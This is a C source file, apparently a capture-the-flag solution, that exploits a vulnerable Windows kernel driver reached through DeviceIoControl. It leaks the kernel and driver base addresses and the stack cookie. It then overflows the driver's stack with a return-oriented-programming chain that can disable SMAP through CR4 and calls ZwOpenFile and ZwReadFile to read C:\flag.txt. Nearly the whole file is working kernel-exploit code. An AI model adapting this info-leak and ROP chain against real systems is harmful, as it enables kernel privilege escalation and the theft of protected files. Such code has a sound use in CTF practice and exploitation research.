#include <assert.h>
#include <stdio.h>
#include <windows.h>

DWORD FlagThread(LPVOID lpThreadParameter)
{
    while (1) {
        printf("%s\n", lpThreadParameter);
        Sleep(1000);
    }
}

int main(int argc, char **argv) {
    BOOL bScout = argc > 1 && strcasecmp(argv[1], "/scout") == 0;

    setbuf(stdout, NULL);

    HANDLE hDevice = CreateFile(
        /* lpFileName */            "\\\\.\\BreathofShadow",
        /* dwDesiredAccess */       GENERIC_READ | GENERIC_WRITE,
        /* dwShareMode */           0,
        /* lpSecurityAttributes */  NULL,
        /* dwCreationDisposition */ OPEN_EXISTING,
        /* dwFlagsAndAttributes */  FILE_ATTRIBUTE_NORMAL,
        /* hTemplateFile */         NULL);
    assert(hDevice != INVALID_HANDLE_VALUE);

    long long Key;
    {
        long long Buf[0x20];
        memset(Buf, 0, sizeof(Buf));
        DWORD dwBytesReturned;
        BOOL bOk = DeviceIoControl(
            /* hDevice */         hDevice,
            /* dwIoControlCode */ 0x9C40240B,
            /* lpInBuffer */      Buf,
            /* nInBufferSize */   sizeof(Buf),
            /* lpOutBuffer */     Buf,
            /* nOutBufferSize */  sizeof(Buf),
            /* lpBytesReturned */ &dwBytesReturned,
            /* lpOverlapped */    NULL
        );
        assert(bOk);
        assert(Buf[0] != 0 && Buf[0] == Buf[1]);
        Key = Buf[0];
    }
    printf("Key:           0x%I64x\n", Key);

    const int cookie1 = 0x100 / 8;
    const int ret1 = 0x128 / 8;
    const int ret2 = 0x158 / 8;
    const int stk1 = 0x1a0 / 8;
    long long DriverBase;
    long long KernelBase;
    long long CryptoBuffer;
    long long Cookie;
    {
        long long Buf[stk1 + 1];
        memset(Buf, 0, sizeof(Buf));
        DWORD dwBytesReturned;
        BOOL bOk = DeviceIoControl(
            /* hDevice */         hDevice,
            /* dwIoControlCode */ 0x9C40240B,
            /* lpInBuffer */      Buf,
            /* nInBufferSize */   0,
            /* lpOutBuffer */     Buf,
            /* nOutBufferSize */  sizeof(Buf),
            /* lpBytesReturned */ &dwBytesReturned,
            /* lpOverlapped */    NULL
        );
        assert(bOk);
        DriverBase = Buf[ret1] - 0x418a;
        KernelBase = Buf[ret2] - 0x30f39;
        CryptoBuffer = Buf[stk1] - 0x4c0;
        Cookie = Buf[cookie1] ^ (CryptoBuffer - 0x30);
    }
    printf("Driver base:   0x%I64x\n", DriverBase);
    printf("Kernel base:   0x%I64x\n", KernelBase);
    printf("Crypto buffer: 0x%I64x\n", CryptoBuffer);
    printf("Cookie:        0x%I64x\n", Cookie);

    {
        long long Buf[ret1 + 67];
        assert(sizeof(Buf) % 64 == 0);
        memset(Buf, 0, sizeof(Buf));
        wchar_t Path[] = L"\\DosDevices\\C:\\flag.txt";
        assert(sizeof(Path) % 8 == 0);
        size_t PathLength = wcslen(Path) * sizeof(wchar_t);

        int OutHandle = 0;
        int ObjectAttributes = 0;
        int IoStatusBlock = 0;
        int UnicodeString = 0;
        int PathBuffer = 0;
        int FlagPos = 0;
        int FlagBuffer = 0;
        for (int step = 0; step < 2; step++) {
            Buf[cookie1] = (Cookie ^ (CryptoBuffer - 0x30));        /* cookie */
            int pos = ret1;
#if DISABLE_SMAP
            Buf[pos++] = (KernelBase + 0x14001FC39 - 0x140001000);  /* pop rcx ; ret */
            Buf[pos++] = 0x406f8;                                   /* cr4 value */
            Buf[pos++] = (KernelBase + 0x14017ae47 - 0x140001000);  /* mov cr4, rcx ; ret */
#else
            Buf[pos++] = (KernelBase + 0x14011CCE2 - 0x140001000);  /* ret */
#endif
            Buf[pos++] = (KernelBase + 0x14036E2F3 - 0x140001000);  /* pop rax; >pop rdx; pop rcx; pop r8; pop r9; pop r10; pop r11; pop rbp; ret */
            Buf[pos++] = 0x80000000;                                /* (DesiredAccess) rdx = GENERIC_READ */
            Buf[pos++] = CryptoBuffer + OutHandle * 8;              /* (FileHandle) rcx = &OUT HANDLE */
            Buf[pos++] = CryptoBuffer + ObjectAttributes * 8;       /* (ObjectAttributes) r8 = &OBJECT_ATTRIBUTES */
            Buf[pos++] = CryptoBuffer + IoStatusBlock * 8;          /* (IoStatusBlock) r9 = &IO_STATUS_BLOCK */
            Buf[pos++] = 0;                                         /* r10 */
            Buf[pos++] = 0;                                         /* r11 */
            Buf[pos++] = 0;                                         /* rbp */
            assert(pos % 2 == 0);
            Buf[pos++] = (KernelBase + 0x1401BDE50 - 0x140001000);  /* ZwOpenFile */
            Buf[pos++] = (KernelBase + 0x14017F2EB - 0x140001000);  /* ZwOpenFile[0x00] = add rsp, 0x38 ; ret */
            Buf[pos++] = 0;                                         /* (Shadow) ZwOpenFile[0x08] */
            Buf[pos++] = 0;                                         /* (Shadow) ZwOpenFile[0x10] */
            Buf[pos++] = 0;                                         /* (Shadow) ZwOpenFile[0x18] */
            Buf[pos++] = 0;                                         /* (Shadow) ZwOpenFile[0x20] */
            Buf[pos++] = 1;                                         /* (ShareAccess) ZwOpenFile[0x28] = FILE_SHARE_READ */
            Buf[pos++] = 0x40;                                      /* (OpenOptions) ZwOpenFile[0x30] = FILE_NON_DIRECTORY_FILE */
            Buf[pos++] = 0;                                         /* ZwOpenFile[0x38] */
            Buf[pos++] = (KernelBase + 0x14036E2F2 - 0x140001000);  /* pop rax; pop rdx; pop rcx; pop r8; pop r9; pop r10; pop r11; pop rbp; ret */
            Buf[pos++] = 0;                                         /* rax */
            Buf[pos++] = 0;                                         /* (Event) rdx = NULL */
            OutHandle = pos;
            Buf[pos++] = 0;                                         /* (FileHandle) rcx */
            Buf[pos++] = 0;                                         /* (ApcRoutine) r8 = NULL */
            Buf[pos++] = 0;                                         /* (ApcContext) r9 = NULL */
            Buf[pos++] = 0;                                         /* r10 */
            Buf[pos++] = 0;                                         /* r11 */
            Buf[pos++] = 0;                                         /* rbp */
            assert(pos % 2 == 0);
            Buf[pos++] = (KernelBase + 0x1401BD8B0 - 0x140001000);  /* ZwReadFile */
            Buf[pos++] = (KernelBase + 0x14029888c - 0x140001000);  /* ZwReadFile[0x00] = add rsp, 0x48 ; ret */
            Buf[pos++] = 0;                                         /* (Shadow) ZwReadFile[0x08] */
            Buf[pos++] = 0;                                         /* (Shadow) ZwReadFile[0x10] */
            Buf[pos++] = 0;                                         /* (Shadow) ZwReadFile[0x18] */
            Buf[pos++] = 0;                                         /* (Shadow) ZwReadFile[0x20] */
            Buf[pos++] = CryptoBuffer + IoStatusBlock * 8;          /* (IoStatusBlock) ZwReadFile[0x28] */
            Buf[pos++] = CryptoBuffer + FlagBuffer * 8;             /* (Buffer) ZwReadFile[0x30] */
            Buf[pos++] = 64;                                        /* (Length) ZwReadFile[0x38] */
            Buf[pos++] = CryptoBuffer + FlagPos * 8;                /* (ByteOffset) ZwReadFile[0x40] */
            Buf[pos++] = 0;                                         /* (Key) ZwReadFile[0x48] */
            Buf[pos++] = (KernelBase + 0x14001FC39 - 0x140001000);  /* pop rcx ; ret */
            Buf[pos++] = (long long)Buf;                            /* (Dst) */
            Buf[pos++] = (KernelBase + 0x140244c62 - 0x140001000);  /* pop rdx ; ret */
            Buf[pos++] = CryptoBuffer + FlagBuffer * 8;             /* (Src) */
            Buf[pos++] = (KernelBase + 0x14012c8cf - 0x140001000);  /* pop r8 ; ret */
            Buf[pos++] = 64;                                        /* (Size) */
            Buf[pos++] = (KernelBase + 0x14011CCE2 - 0x140001000);  /* ret */
            assert(pos % 2 == 0);
            Buf[pos++] = (KernelBase + 0x1401D4040 - 0x140001000);  /* memmove */
            Buf[pos++] = (KernelBase + 0x14001fc39 - 0x140001000);  /* pop rcx; ret */
            Buf[pos++] = (KernelBase + 0x14002dcb2 - 0x140001000);  /* jmp rcx */
            Buf[pos++] = (KernelBase + 0x14002dcb2 - 0x140001000);  /* jmp rcx */
            ObjectAttributes = pos;
            Buf[pos++] = 0x30;                                      /* OBJECT_ATTRIBUTES.Length = sizeof(OBJECT_ATTRIBUTES) */
            Buf[pos++] = 0;                                         /* OBJECT_ATTRIBUTES.RootDirectory = NULL */
            Buf[pos++] = CryptoBuffer + UnicodeString * 8;          /* OBJECT_ATTRIBUTES.ObjectName = &UNICODE_STRING */
            Buf[pos++] = 0x40 | 0x200;                              /* OBJECT_ATTRIBUTES.Attributes = OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE */
            Buf[pos++] = 0;                                         /* OBJECT_ATTRIBUTES.SecurityDescriptor = NULL */
            Buf[pos++] = 0;                                         /* OBJECT_ATTRIBUTES.SecurityQualityOfService = NULL */
            IoStatusBlock = pos;
            Buf[pos++] = 0;                                         /* IO_STATUS_BLOCK.Status = 0 */
            Buf[pos++] = 0;                                         /* IO_STATUS_BLOCK.Information = 0 */
            UnicodeString = pos;
            Buf[pos++] = (PathLength | (PathLength << 16));         /* UNICODE_STRING.Length, MaximumLength = #bytes */
            Buf[pos++] = CryptoBuffer + PathBuffer * 8;             /* UNICODE_STRING.Buffer = &Path */
            PathBuffer = pos;
            for (size_t i = 0; i < sizeof(Path) / 8; i++)
                Buf[pos++] = *(long long *)&Path[i * 4];
            assert(pos < sizeof(Buf) / sizeof(Buf[0]));
            FlagPos = pos;
            Buf[pos++] = 0;                                         /* LARGE_INTEGER.HighPart */
            Buf[pos++] = 0;                                         /* LARGE_INTEGER.LowPart */
            FlagBuffer = pos;
        }

        printf("Buf:           0x%I64x\n", Buf);
        for (size_t i = 0; i < sizeof(Buf) / sizeof(Buf[0]); i++)
            printf("0x%I64x: 0x%I64x\n", CryptoBuffer + i * 8, Buf[i]);

        if (bScout)
            return 0;

        /* Give the output some time to reach the remote user */
        Sleep(1000);

        for (size_t i = 0; i < sizeof(Buf) / sizeof(Buf[0]); i++)
            Buf[i] ^= Key;

        CreateThread(
            /* lpThreadAttributes */ NULL,
            /* dwStackSize */        0,
            /* lpStartAddress */     FlagThread,
            /* lpParameter */        Buf,
            /* dwCreationFlags */    0,
            /* lpThreadId */         NULL);

        DWORD dwBytesReturned;
        DeviceIoControl(
            /* hDevice */         hDevice,
            /* dwIoControlCode */ 0x9C40240B,
            /* lpInBuffer */      Buf,
            /* nInBufferSize */   sizeof(Buf),
            /* lpOutBuffer */     Buf,
            /* nOutBufferSize */  sizeof(Buf[0]),
            /* lpBytesReturned */ &dwBytesReturned,
            /* lpOverlapped */    NULL);

        /* We will never come here, this thread will be stuck in the kernel forever */
        abort();
    }
}
